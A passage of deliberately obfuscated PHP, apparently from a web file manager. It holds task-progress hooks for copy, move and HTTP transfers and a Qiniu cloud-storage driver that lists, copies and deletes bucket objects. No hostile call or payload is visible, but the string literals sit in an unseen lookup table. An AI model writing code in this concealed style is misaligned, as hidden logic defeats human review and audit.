Hook::bind($°ˆ÷½ÏÄ[628], array($this, $°ˆ÷½ÏÄ[1726])); Hook::bind($°ˆ÷½ÏÄ[629], array($this, $°ˆ÷½ÏÄ[1727])); Hook::bind($°ˆ÷½ÏÄ[594], array($this, $°ˆ÷½ÏÄ[1728])); Hook::bind($°ˆ÷½ÏÄ[591], array($this, $°ˆ÷½ÏÄ[1728])); Hook::bind($°ˆ÷½ÏÄ[596], array($this, $°ˆ÷½ÏÄ[1728])); Hook::bind($°ˆ÷½ÏÄ[598], array($this, $°ˆ÷½ÏÄ[1728])); Hook::bind($°ˆ÷½ÏÄ[600], array($this, $°ˆ÷½ÏÄ[1728])); Hook::bind($°ˆ÷½ÏÄ[1729], array($this, $°ˆ÷½ÏÄ[1730])); Hook::bind($°ˆ÷½ÏÄ[616], array($this, $°ˆ÷½ÏÄ[1731])); $this->sourceModelCopyFlag = !1; Hook::bind($°ˆ÷½ÏÄ[1732], array($this, $°ˆ÷½ÏÄ[1733])); Hook::bind($°ˆ÷½ÏÄ[1734], array($this, $°ˆ÷½ÏÄ[1735])); Hook::bind($°ˆ÷½ÏÄ[1736], array($this, $°ˆ÷½ÏÄ[1737])); $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1738]] = LNG($°ˆ÷½ÏÄ[1739]); $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1740]] = 0; $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1741]] = 0; $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1109]] = $°ˆ÷½ÏÄ[12]; $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1742]] = $°ˆ÷½ÏÄ[12]; $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1743]] = 0; $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1744]] = 0; $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1745]] = 0; if (!$Ÿ“œ£õû[$°ˆ÷½ÏÄ[1584]]) { $Ÿ“œ£õû[$°ˆ÷½ÏÄ[1584]] = LNG($°ˆ÷½ÏÄ[1746]); } } protected function endAfter() { $«íÉíí§ =& $_SERVER[…É¦À–]; Hook::unbind($«íÉíí§[1717], array($this, $«íÉíí§[1718])); Hook::unbind($«íÉíí§[1268], array($this, $«íÉíí§[1719])); Hook::unbind($«íÉíí§[1720], array($this, $«íÉíí§[1721])); Hook::unbind($«íÉíí§[625], array($this, $«íÉíí§[1722])); Hook::unbind($«íÉíí§[626], array($this, $«íÉíí§[1723])); Hook::unbind($«íÉíí§[631], array($this, $«íÉíí§[1724])); Hook::unbind($«íÉíí§[632], array($this, $«íÉíí§[1725])); Hook::unbind($«íÉíí§[628], array($this, $«íÉíí§[1726])); Hook::unbind($«íÉíí§[629], array($this, $«íÉíí§[1727])); Hook::unbind($«íÉíí§[594], array($this, $«íÉíí§[1728])); Hook::unbind($«íÉíí§[591], array($this, $«íÉíí§[1728])); Hook::unbind($«íÉíí§[596], array($this, $«íÉíí§[1728])); Hook::unbind($«íÉíí§[598], array($this, $«íÉíí§[1728])); Hook::unbind($«íÉíí§[600], array($this, $«íÉíí§[1728])); Hook::unbind($«íÉíí§[1729], array($this, $«íÉíí§[1730])); Hook::unbind($«íÉíí§[616], array($this, $«íÉíí§[1731])); Hook::unbind($«íÉíí§[1732], array($this, $«íÉíí§[1733])); Hook::unbind($«íÉíí§[1734], array($this, $«íÉíí§[1735])); Hook::unbind($«íÉíí§[1736], array($this, $«íÉíí§[1737])); } public function copyMoveStart($Ä‚Ê ç, $ÖûÏŒÅ“, $ì˜†ô–½, $¾ÀÅ„÷³) { $íÙüÙº¸ =& $_SERVER[…É¦À–]; self::log($íÙüÙº¸[1747] . $ÖûÏŒÅ“ . $íÙüÙº¸[70] . $¾ÀÅ„÷³); $ÀçÕ¾«ú = rtrim(TEMP_FILES, $íÙüÙº¸[8]); if (substr($ÖûÏŒÅ“, 0, strlen($ÀçÕ¾«ú)) == $ÀçÕ¾«ú) { return; } if (substr($¾ÀÅ„÷³, 0, strlen($ÀçÕ¾«ú)) == $ÀçÕ¾«ú) { return; } $œ¶Ó†´« =& $this->task; $œ¶Ó†´«[$íÙüÙº¸[1748]] = KodIO::transferType($Ä‚Ê ç, $ì˜†ô–½); $this->update(); } public function updateAfter() { $Ÿâá‚È€ =& $_SERVER[…É¦À–]; $´î‹ÂäÃ =& $this->task; if (!$´î‹ÂäÃ[$Ÿâá‚È€[803]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($´î‹ÂäÃ[$Ÿâá‚È€[1748]] == $Ÿâá‚È€[1360]) { return; } self::updateTask($´î‹ÂäÃ); } private static function updateTask(&$ë‚“Ÿİ ) { $Îø‰ç‰Ë =& $_SERVER[…É¦À–]; if ($ë‚“Ÿİ [$Îø‰ç‰Ë[1748]] == $Îø‰ç‰Ë[1239] || $ë‚“Ÿİ [$Îø‰ç‰Ë[1748]] == $Îø‰ç‰Ë[107]) { if ($ë‚“Ÿİ [$Îø‰ç‰Ë[1742]]) { $ë‚“Ÿİ [$Îø‰ç‰Ë[1745]] = $ë‚“Ÿİ [$Îø‰ç‰Ë[1744]] + $ë‚“Ÿİ [$Îø‰ç‰Ë[1741]]; } } else { if ($ë‚“Ÿİ [$Îø‰ç‰Ë[1748]] == $Îø‰ç‰Ë[1361]) { if ($ë‚“Ÿİ [$Îø‰ç‰Ë[1742]] == $Îø‰ç‰Ë[1239]) { $ë‚“Ÿİ [$Îø‰ç‰Ë[1745]] = $ë‚“Ÿİ [$Îø‰ç‰Ë[1744]] + $ë‚“Ÿİ [$Îø‰ç‰Ë[1741]] * 0.5; } else { if ($ë‚“Ÿİ [$Îø‰ç‰Ë[1742]] == $Îø‰ç‰Ë[107]) { $ë‚“Ÿİ [$Îø‰ç‰Ë[1745]] = $ë‚“Ÿİ [$Îø‰ç‰Ë[1744]] + $ë‚“Ÿİ [$Îø‰ç‰Ë[1740]] * 0.5 + $ë‚“Ÿİ [$Îø‰ç‰Ë[1741]] * 0.5; } } } } $ë‚“Ÿİ [$Îø‰ç‰Ë[1689]] = $ë‚“Ÿİ [$Îø‰ç‰Ë[1745]] / $ë‚“Ÿİ [$Îø‰ç‰Ë[803]]; if ($ë‚“Ÿİ [$Îø‰ç‰Ë[1689]] > 0) { $Äİ©òÁ = timeFloat() - $ë‚“Ÿİ [$Îø‰ç‰Ë[1691]] - $ë‚“Ÿİ [$Îø‰ç‰Ë[1694]]; $ë‚“Ÿİ [$Îø‰ç‰Ë[1695]] = $Äİ©òÁ * (1 - $ë‚“Ÿİ [$Îø‰ç‰Ë[1689]]) / $ë‚“Ÿİ [$Îø‰ç‰Ë[1689]]; } } public function addPath($Ë¨Õ—’) { $ÈùÛ‹èÌ =& $_SERVER[…É¦À–]; if (!$Ë¨Õ—’) { return; } $Ò…£Ğí =& $this->task; $·¸ÓÛˆ¿ = IO::infoWithChildren($Ë¨Õ—’); $‡‘€Ò¹û = $Ò…£Ğí[$ÈùÛ‹èÌ[1749]] ? $Ò…£Ğí[$ÈùÛ‹èÌ[1749]][$ÈùÛ‹èÌ[1750]] : 0; $Ò…£Ğí[$ÈùÛ‹èÌ[1749]] = array($ÈùÛ‹èÌ[1750] => $‡‘€Ò¹û + 1, $ÈùÛ‹èÌ[449] => $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[32]], $ÈùÛ‹èÌ[84] => $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[84]], $ÈùÛ‹èÌ[538] => $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[538]] ? $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[538]] : $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[84]]); if ($·¸ÓÛˆ¿[$ÈùÛ‹èÌ[33]] == $ÈùÛ‹èÌ[200]) { $Ò…£Ğí[$ÈùÛ‹èÌ[826]] += 1; } else { $Ò…£Ğí[$ÈùÛ‹èÌ[826]] += $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[79]][$ÈùÛ‹èÌ[77]]; if ($·¸ÓÛˆ¿[$ÈùÛ‹èÌ[431]]) { $Ò…£Ğí[$ÈùÛ‹èÌ[826]] += $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[79]][$ÈùÛ‹èÌ[78]] + 1; } } $Ò…£Ğí[$ÈùÛ‹èÌ[803]] += $·¸ÓÛˆ¿[$ÈùÛ‹èÌ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($öÇáÇÌ¢) { } public function sourceAddHashEnd($„¨½ŞÀ) { } public function sourceAddFileStart($Ø¨†¼ŒŸ) { $ÆØ¿ñ‡¶ =& $_SERVER[…É¦À–]; $ïø§µÒâ =& $this->task; $ïø§µÒâ[$ÆØ¿ñ‡¶[1740]] = $Ø¨†¼ŒŸ[$ÆØ¿ñ‡¶[76]]; $ïø§µÒâ[$ÆØ¿ñ‡¶[1738]] = $Ø¨†¼ŒŸ[$ÆØ¿ñ‡¶[32]]; $ïø§µÒâ[$ÆØ¿ñ‡¶[1109]] = $Ø¨†¼ŒŸ[$ÆØ¿ñ‡¶[32]]; $ïø§µÒâ[$ÆØ¿ñ‡¶[1751]] = $Ø¨†¼ŒŸ[$ÆØ¿ñ‡¶[84]]; $this->update(); } public function sourceAddFileEnd($®›ò®Œ) { $®ƒ×©«‘ =& $_SERVER[…É¦À–]; $ŒÏ³½ú =& $this->task; $ŒÏ³½ú[$®ƒ×©«‘[1745]] += $®›ò®Œ[$®ƒ×©«‘[76]]; $ŒÏ³½ú[$®ƒ×©«‘[1751]] = $®›ò®Œ[$®ƒ×©«‘[84]]; $this->update(1); } public function copyFileStart($Å†µæ¾, $äÄ¶Âş‡, $”Ğ¯ ­Ò, $Œ–ÛÔ¦”, $ˆ¿•§®—, $”ë÷ŸüÙ) { $¼ÌŒ ¿Æ =& $_SERVER[…É¦À–]; $×ùó×è‚ = $ˆ¿•§®—; if ($×ùó×è‚ == $GLOBALS[$¼ÌŒ ¿Æ[1752]]) { $×ùó×è‚ = $GLOBALS[$¼ÌŒ ¿Æ[1753]]; } $GLOBALS[$¼ÌŒ ¿Æ[1753]] = $ˆ¿•§®—; $GLOBALS[$¼ÌŒ ¿Æ[1752]] = $”ë÷ŸüÙ; $¬óÂË =& $this->task; $¬óÂË[$¼ÌŒ ¿Æ[1738]] = $×ùó×è‚; $¬óÂË[$¼ÌŒ ¿Æ[1740]] = (int) $Å†µæ¾->size($äÄ¶Âş‡); $¬óÂË[$¼ÌŒ ¿Æ[1741]] = 0; $¬óÂË[$¼ÌŒ ¿Æ[1109]] = $¼ÌŒ ¿Æ[12]; $¬óÂË[$¼ÌŒ ¿Æ[1742]] = $¼ÌŒ ¿Æ[12]; $¬óÂË[$¼ÌŒ ¿Æ[1743]] = 0; $Û”›êéÅ = $¬óÂË[$¼ÌŒ ¿Æ[1740]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¬óÂË[$¼ÌŒ ¿Æ[428]] . $¼ÌŒ ¿Æ[1754]); if ($Û”›êéÅ && file_exists(get_path_father($Œ–ÛÔ¦”))) { Cache::set($¬óÂË[$¼ÌŒ ¿Æ[428]] . $¼ÌŒ ¿Æ[1754], $Œ–ÛÔ¦”); $¬óÂË[$¼ÌŒ ¿Æ[1711]] = array($¼ÌŒ ¿Æ[1755], $¼ÌŒ ¿Æ[1756]); } $this->update(0, $Û”›êéÅ); } public static function updateCopyLocalFileSize($Ø¼›ºãÍ) { $ïê® ÒÂ =& $_SERVER[…É¦À–]; $ëş£İ€ø = Cache::get($Ø¼›ºãÍ[$ïê® ÒÂ[428]] . $ïê® ÒÂ[1754]); if (!$ëş£İ€ø || !file_exists($ëş£İ€ø)) { return $Ø¼›ºãÍ; } $Ø¼›ºãÍ[$ïê® ÒÂ[1741]] = @filesize($ëş£İ€ø); $Ø¼›ºãÍ[$ïê® ÒÂ[1745]] += $Ø¼›ºãÍ[$ïê® ÒÂ[1741]]; self::updateTask($Ø¼›ºãÍ); return $Ø¼›ºãÍ; } public function copyFileEnd($æ—ôóæç, $ÒÇÚğ€, $ºÕöŸ÷Œ, $µ•Áà³, $à¢†åÅ‡, $Úõ¹Ö“¸) { $‘Ñ°‰½Ó =& $_SERVER[…É¦À–]; $¼¥Ü¿ÌÖ =& $this->task; $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1741]] = $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1740]]; $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1742]] = $‘Ñ°‰½Ó[12]; unset($¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1711]]); if ($à¢†åÅ‡ == $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1738]]) { $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1744]] += $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1740]]; $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1745]] = $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1744]]; $¢áûÄİğ = 1; if (isset($¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1751]]) && $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1751]] == $ÒÇÚğ€) { $¢áûÄİğ = 0; } $this->update($¢áûÄİğ); } else { $this->update(); $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1741]] = 0; } Cache::remove($¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[428]] . $‘Ñ°‰½Ó[1754]); self::log($‘Ñ°‰½Ó[1757] . $ÒÇÚğ€ . $‘Ñ°‰½Ó[70] . $µ•Áà³ . $‘Ñ°‰½Ó[231] . $à¢†åÅ‡ . $‘Ñ°‰½Ó[1758] . $¼¥Ü¿ÌÖ[$‘Ñ°‰½Ó[1738]]); } public function updateFileEnd($Ì®Ò®©ñ, $Ï ìÑ) { $Ø¹œŒšı =& $_SERVER[…É¦À–]; $€…°³œ =& $this->task; $€…°³œ[$Ø¹œŒšı[1738]] = $Ì®Ò®©ñ; $€…°³œ[$Ø¹œŒšı[1740]] = $Ï ìÑ; $€…°³œ[$Ø¹œŒšı[1744]] += $Ï ìÑ; $€…°³œ[$Ø¹œŒšı[1745]] = $€…°³œ[$Ø¹œŒšı[1744]]; $this->update(1); self::log($Ø¹œŒšı[1759] . $Ì®Ò®©ñ); } public function sourceModelCopy($…¶»ô–ı) { $‘•Ä²İª =& $_SERVER[…É¦À–]; $á§š¦º = $…¶»ô–ı[0]; $ñƒ× = $…¶»ô–ı[1]; $Ëşı×š¡ =& $this->task; $this->sourceModelCopyFlag = !0; $ÃÜä€ƒ = 0; switch ($á§š¦º) { case $‘•Ä²İª[592]: $ÃÜä€ƒ = 1; break; case $‘•Ä²İª[595]: $Ëşı×š¡[$‘•Ä²İª[1738]] = $ñƒ×[$‘•Ä²İª[32]]; break; case $‘•Ä²İª[597]: $ÃÜä€ƒ = intval($…¶»ô–ı[$‘•Ä²İª[409]] * 0.4); break; case $‘•Ä²İª[599]: $ÃÜä€ƒ = intval($…¶»ô–ı[$‘•Ä²İª[409]] * 0.2); break; case $‘•Ä²İª[601]: $ÃÜä€ƒ = intval($…¶»ô–ı[$‘•Ä²İª[409]] * 0.4); break; } $this->update($ÃÜä€ƒ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($£¥€ºé, $ãºïÕ¯) { $ê´ô«Üƒ =& $_SERVER[…É¦À–]; $this->sourceModelCopyFlag = !0; $çˆ‡·¸ = 1; if (isset($£¥€ºé[$ê´ô«Üƒ[79]])) { $çˆ‡·¸ = $£¥€ºé[$ê´ô«Üƒ[79]][$ê´ô«Üƒ[77]]; $çˆ‡·¸ = $çˆ‡·¸ + $£¥€ºé[$ê´ô«Üƒ[79]][$ê´ô«Üƒ[78]] + 1; } $this->update($çˆ‡·¸); $this->sourceModelCopyFlag = !1; } public function sourceMove($åâìÛ) { $this->sourceRemove($åâìÛ, !1); } public function curlProgress($´‚Íˆ©¸, $®åÙ†û, $æİâÌ°, $€–‘Ù›â, $ÂÛ×‹¤ù) { $¶êğôìÄ =& $_SERVER[…É¦À–]; $ìïæáªÔ =& $this->task; if ($ÂÛ×‹¤ù > 0) { $ìïæáªÔ[$¶êğôìÄ[1109]] = $¶êğôìÄ[1760]; $ìïæáªÔ[$¶êğôìÄ[1742]] = $¶êğôìÄ[107]; if ($ìïæáªÔ[$¶êğôìÄ[1740]]) { $ìïæáªÔ[$¶êğôìÄ[1741]] = $ÂÛ×‹¤ù; } if ($ìïæáªÔ[$¶êğôìÄ[1743]]) { $ìïæáªÔ[$¶êğôìÄ[1741]] = $ÂÛ×‹¤ù + $ìïæáªÔ[$¶êğôìÄ[1743]]; } } else { if ($æİâÌ° > 0) { if ($ìïæáªÔ[$¶êğôìÄ[1740]] == $®åÙ†û) { $ìïæáªÔ[$¶êğôìÄ[1741]] = $æİâÌ°; $ìïæáªÔ[$¶êğôìÄ[1109]] = $¶êğôìÄ[1761]; $ìïæáªÔ[$¶êğôìÄ[1742]] = $¶êğôìÄ[1239]; } } } $this->update(); } public function curlProgressStart($ş¸ë¯ã¹) { } public function curlProgressEnd($«×æšÎØ) { $‰ïç‚ıŠ =& $_SERVER[…É¦À–]; $†şŒø® =& $this->task; $ş´áßÙ¬ = curl_getinfo($«×æšÎØ); $Ñ…«ƒœ = $ş´áßÙ¬[$‰ïç‚ıŠ[1762]]; if ($Ñ…«ƒœ == -1) { $Ñ…«ƒœ = $ş´áßÙ¬[$‰ïç‚ıŠ[1763]]; } if ($†şŒø®[$‰ïç‚ıŠ[1742]] == $‰ïç‚ıŠ[107] && $Ñ…«ƒœ) { $†şŒø®[$‰ïç‚ıŠ[1743]] += $Ñ…«ƒœ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $İ†ÁÄÄ© =& $_SERVER[…É¦À–]; $ê¦±¸‡é =& $this->task; $ê¦±¸‡é[$İ†ÁÄÄ©[1764]] = 1; Hook::bind($İ†ÁÄÄ©[1732], array($this, $İ†ÁÄÄ©[1765])); Hook::bind($İ†ÁÄÄ©[1734], array($this, $İ†ÁÄÄ©[1766])); Hook::bind($İ†ÁÄÄ©[1736], array($this, $İ†ÁÄÄ©[1767])); } protected function endAfter() { $Œ‰è»í =& $_SERVER[…É¦À–]; Hook::unbind($Œ‰è»í[1732], array($this, $Œ‰è»í[1765])); Hook::unbind($Œ‰è»í[1734], array($this, $Œ‰è»í[1766])); Hook::unbind($Œ‰è»í[1736], array($this, $Œ‰è»í[1767])); } public function progressStart($­Ò¿ßüâ) { $Ë¡ÒÃªÏ =& $_SERVER[…É¦À–]; $·ğÒ’™· = curl_getinfo($­Ò¿ßüâ); self::log($Ë¡ÒÃªÏ[1768] . $·ğÒ’™·[$Ë¡ÒÃªÏ[336]]); self::valueSet($this->task[$Ë¡ÒÃªÏ[428]], $this->task); } public function progressEnd($»§ã³©™) { $ıšÉâ¸¯ =& $_SERVER[…É¦À–]; self::log($ıšÉâ¸¯[1769] . $this->task[$ıšÉâ¸¯[428]]); $this->end(); } public function progress($Öİæò›, $¹€È«š, $ÏÊïÚìÂ, $ª´ÇŞ·Ä, $Ô¾ØÖÈ) { $Íê¥ñÀ =& $_SERVER[…É¦À–]; $ôñ“½øš =& $this->task; if ($Ô¾ØÖÈ > 0) { $ôñ“½øš[$Íê¥ñÀ[826]] = $ôñ“½øš[$Íê¥ñÀ[826]] == 0 ? $ª´ÇŞ·Ä : $ôñ“½øš[$Íê¥ñÀ[826]]; $ôñ“½øš[$Íê¥ñÀ[1688]] = $Ô¾ØÖÈ; } else { if ($ÏÊïÚìÂ > 0) { $ôñ“½øš[$Íê¥ñÀ[826]] = $ôñ“½øš[$Íê¥ñÀ[826]] == 0 ? $¹€È«š : $ôñ“½øš[$Íê¥ñÀ[826]]; $ôñ“½øš[$Íê¥ñÀ[1688]] = $ÏÊïÚìÂ; } } $this->update(); self::log("\x70\162\x6f\x67\162\145\163\163\x48\164\x74\160\72\x64\x6f\167\x6e\72{$ÏÊïÚìÂ}\57{$¹€È«š}\73\40\165\160\x6c\157\x61\x64\72{$Ô¾ØÖÈ}\x2f{$ª´ÇŞ·Ä}\73"); } } goto AØåù¡­³; CˆÙ•´› : class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÛüïÃ£à) { parent::__construct(); require_once SDK_DIR . $_SERVER[…É¦À–][1456]; $this->_init($ÛüïÃ£à); } public function _init($á«½òÓˆ) { $ªæ”ç§ =& $_SERVER[…É¦À–]; $this->config = $á«½òÓˆ; foreach ($á«½òÓˆ as $äƒá€´† => $İì÷ã¨Ä) { if (isset($this->{$äƒá€´†})) { $this->{$äƒá€´†} = $İì÷ã¨Ä; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ªæ”ç§[1457] . LNG($ªæ”ç§[1415])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ç¿£×İØ, $ÅÆ›Á³ = '', $¬ÄÌÛÌŸ = REPEAT_RENAME) { if ($this->setContent($Ç¿£×İØ, $ÅÆ›Á³)) { return $this->getPathOuter($Ç¿£×İØ); } return !1; } public function mkdir($ø’ŸØ¦¶, $øŸ©¿â = REPEAT_SKIP) { $ÉÛ³‹ù¶ =& $_SERVER[…É¦À–]; $ØŸºÁê• = trim($ø’ŸØ¦¶, $ÉÛ³‹ù¶[8]); if ($this->_isFolder($ØŸºÁê•)) { return $this->getPathOuter($ØŸºÁê•); } $ø’ŸØ¦¶ = $ØŸºÁê• . $ÉÛ³‹ù¶[8]; $çÇ¸·«Ç = get_path_this($ØŸºÁê•); $ÕòÆ–Ø™ = $ø’ŸØ¦¶ . $çÇ¸·«Ç; if (!$this->mkfile($ÕòÆ–Ø™)) { return !1; } if (!$this->moveFile($ÕòÆ–Ø™, $ø’ŸØ¦¶)) { $this->delFile($ÕòÆ–Ø™); return !1; } return $this->getPathOuter($ØŸºÁê•); } public function copyFile($îèêá…§, $¬—‚‰ü«) { $ˆÄÏ¥Ğ¬ = $this->bucketManager->copy($this->bucket, $îèêá…§, $this->bucket, $¬—‚‰ü«, !0); return $ˆÄÏ¥Ğ¬ ? !1 : $this->getPathOuter($¬—‚‰ü«); } public function moveFile($ğ€äò½İ, $ôïİ€Á‹) { $Ø«ãÎ¥æ = $this->bucketManager->move($this->bucket, $ğ€äò½İ, $this->bucket, $ôïİ€Á‹, !0); return $Ø«ãÎ¥æ ? !1 : $this->getPathOuter($ôïİ€Á‹); } public function delFile($ÌãÅİï¤) { if (!$this->exist($ÌãÅİï¤)) { return !0; } $–°íŸÌ = $this->bucketManager->delete($this->bucket, $ÌãÅİï¤); return $–°íŸÌ ? !1 : !0; } public function delFolder($Á¡ˆ…ºÙ) { $Ìƒ¬¹óÓ =& $_SERVER[…É¦À–]; if (!$this->exist($Á¡ˆ…ºÙ)) { return !0; } $this->listItemCache = !1; $ÄİÏ‹Íˆ = $this->fileList($Á¡ˆ…ºÙ); $this->listItemCache = !0; $‹ùÍİØ = trim($Á¡ˆ…ºÙ, $Ìƒ¬¹óÓ[8]) . $Ìƒ¬¹óÓ[8]; if (!empty($Á¡ˆ…ºÙ) && $Á¡ˆ…ºÙ !== $Ìƒ¬¹óÓ[198] && !in_array($‹ùÍİØ, $ÄİÏ‹Íˆ[$Ìƒ¬¹óÓ[82]])) { $ÄİÏ‹Íˆ[$Ìƒ¬¹óÓ[82]][] = $‹ùÍİØ; } $½öØ¯ Ô = $this->delByBatch($ÄİÏ‹Íˆ[$Ìƒ¬¹óÓ[83]]); if (!$½öØ¯ Ô) { return !1; } $½öØ¯ Ô = $this->delByBatch($ÄİÏ‹Íˆ[$Ìƒ¬¹óÓ[82]]); if (!$½öØ¯ Ô) { return !1; } return $this->delFile($‹ùÍİØ); } private function delByBatch($ÊÙÈÜ©) { foreach (array_chunk($ÊÙÈÜ©, 1000) as $¸Á“‹ò) { $ï€ì‰ğ = $this->bucketManager->buildBatchDelete($this->bucket, $¸Á“‹ò); list($“Æ‘Ìê×, $àíùû) = $this->bucketManager->batch($ï€ì‰ğ); if ($àíùû) { return !1; } } return !0; } public function rename($Â„ú‰Äü, $¯…ÁŞ‘É) { return $this->renameObject($Â„ú‰Äü, $¯…ÁŞ‘É); } public function fileInfo($¡×İ¸Øè, $©¸©¨¾Æ = false, $£ÛàÉİ› = array()) { $¦ÁÃÈçÆ =& $_SERVER[…É¦À–]; $‡ŞŞî¸ß = array($¦ÁÃÈçÆ[32] => $this->pathThis($¡×İ¸Øè), $¦ÁÃÈçÆ[84] => $this->getPathOuter($¦ÁÃÈçÆ[8] . $¡×İ¸Øè), $¦ÁÃÈçÆ[33] => $¦ÁÃÈçÆ[200], $¦ÁÃÈçÆ[76] => isset($£ÛàÉİ›[$¦ÁÃÈçÆ[1458]]) ? $£ÛàÉİ›[$¦ÁÃÈçÆ[1458]] : 0, $¦ÁÃÈçÆ[174] => $this->ext($¡×İ¸Øè)); if ($©¸©¨¾Æ) { return $‡ŞŞî¸ß; } $‡ŞŞî¸ß[$¦ÁÃÈçÆ[201]] = $‡ŞŞî¸ß[$¦ÁÃÈçÆ[85]] = 0; $‡ŞŞî¸ß[$¦ÁÃÈçÆ[202]] = $‡ŞŞî¸ß[$¦ÁÃÈçÆ[203]] = !0; if (empty($£ÛàÉİ›)) { $£ÛàÉİ› = $this->objectMeta($¡×İ¸Øè); if (!$£ÛàÉİ›) { return $‡ŞŞî¸ß; } } if (isset($£ÛàÉİ›[$¦ÁÃÈçÆ[1459]])) { $‡ŞŞî¸ß[$¦ÁÃÈçÆ[85]] = substr($£ÛàÉİ›[$¦ÁÃÈçÆ[1459]] . $¦ÁÃÈçÆ[12], 0, 10); } if (isset($£ÛàÉİ›[$¦ÁÃÈçÆ[1458]])) { $‡ŞŞî¸ß[$¦ÁÃÈçÆ[76]] = $£ÛàÉİ›[$¦ÁÃÈçÆ[1458]]; } return $‡ŞŞî¸ß; } public function folderInfo($¡ğ™àÆ, $•Ê¡ ë£ = false) { $¿‰¨Ö²× =& $_SERVER[…É¦À–]; $õ©—‹Ò© = array($¿‰¨Ö²×[32] => $this->pathThis($¡ğ™àÆ), $¿‰¨Ö²×[84] => $this->getPathOuter($¿‰¨Ö²×[8] . $¡ğ™àÆ), $¿‰¨Ö²×[33] => $¿‰¨Ö²×[75]); if ($•Ê¡ ë£) { return $õ©—‹Ò©; } $õ©—‹Ò©[$¿‰¨Ö²×[201]] = $õ©—‹Ò©[$¿‰¨Ö²×[85]] = 0; $õ©—‹Ò©[$¿‰¨Ö²×[202]] = $õ©—‹Ò©[$¿‰¨Ö²×[203]] = !0; $¡ğ™àÆ = rtrim($¡ğ™àÆ, $¿‰¨Ö²×[8]) . $¿‰¨Ö²×[8]; $êõµÄ»Ñ = $this->objectMeta($¡ğ™àÆ); if (isset($êõµÄ»Ñ[$¿‰¨Ö²×[1459]])) { $õ©—‹Ò©[$¿‰¨Ö²×[85]] = substr($êõµÄ»Ñ[$¿‰¨Ö²×[1459]] . $¿‰¨Ö²×[12], 0, 10); } return $õ©—‹Ò©; } public function listPath($«ñôù¸, $¹˜ˆØµ = false) { $ûË£¥¾ =& $_SERVER[…É¦À–]; $òğéÃ…İ = $this->fileList($«ñôù¸, $ûË£¥¾[8], !0); foreach ($òğéÃ…İ[$ûË£¥¾[82]] as $¢Î“¬ı¤ => $’¤‚é‰ë) { $òğéÃ…İ[$ûË£¥¾[82]][$¢Î“¬ı¤] = $this->folderInfo($’¤‚é‰ë, $¹˜ˆØµ); } foreach ($òğéÃ…İ[$ûË£¥¾[83]] as $¢Î“¬ı¤ => $’¤‚é‰ë) { $òğéÃ…İ[$ûË£¥¾[83]][$¢Î“¬ı¤] = $this->fileInfo($’¤‚é‰ë[$ûË£¥¾[94]], $¹˜ˆØµ, $’¤‚é‰ë); } return $òğéÃ…İ; } public function has($´‚ª…ø», $É§¬¸çÅ = false, $ğí¹Š¥æ = true) { $ãÑôÁÃ =& $_SERVER[…É¦À–]; $´‚ª…ø» = trim($´‚ª…ø», $ãÑôÁÃ[8]); $›¾‚“Î° = empty($´‚ª…ø») && $´‚ª…ø» !== $ãÑôÁÃ[198] ? $ãÑôÁÃ[12] : $´‚ª…ø» . $ãÑôÁÃ[8]; $àÍê¬ÇÉ = $ãÑôÁÃ[12]; $ŒüáşÆ° = 500; $âÑà¹ = $ãÑôÁÃ[8]; $‹¯’¬Î‹ = $âØ¶ø©Ã = 0; while (!0) { check_abort(); list($ºãÃ„ÅÆ, $éôëÅ‰ï) = $this->bucketManager->listFiles($this->bucket, $›¾‚“Î°, $àÍê¬ÇÉ, $ŒüáşÆ°, $âÑà¹); if ($éôëÅ‰ï) { break; } $àÍê¬ÇÉ = array_key_exists($ãÑôÁÃ[1427], $ºãÃ„ÅÆ) ? $àÍê¬ÇÉ = $ºãÃ„ÅÆ[$ãÑôÁÃ[1460]] : $ãÑôÁÃ[12]; if ($É§¬¸çÅ) { if (!empty($ºãÃ„ÅÆ[$ãÑôÁÃ[1461]])) { $‹¯’¬Î‹ += count($ºãÃ„ÅÆ[$ãÑôÁÃ[1461]]); } if (!empty($ºãÃ„ÅÆ[$ãÑôÁÃ[1462]])) { 